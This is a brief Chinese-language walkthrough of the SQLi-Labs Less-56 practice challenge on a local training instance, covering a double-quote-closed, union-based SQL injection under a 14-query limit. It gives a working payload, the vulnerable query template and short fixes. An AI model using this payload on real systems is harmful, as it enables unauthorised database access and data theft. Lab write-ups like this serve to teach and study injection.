# SQLi-Labs | Less-56 挑战关卡 双引号 14次机会
## 一、漏洞简介
GET双引号字符注入，页面回显，session限制14次查询，联合注入。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-56/?id=1
注入类型：GET、字符型、"闭合、联合注入、次数限制
## 三、复现步骤
1. ?id=1" 报错，双引号闭合。
2. union联合查询，控制次数拿到flag。
## 四、Payload
`?id=-1" union select 1,version(),database() --+`
## 五、漏洞原理
`SELECT * FROM users WHERE id="$id" LIMIT 0,1`
服务端计数，限制查询次数。
## 六、修复方案
1. 预编译，限流。
## 七、总结
Less56双引号闭合，次数限制挑战。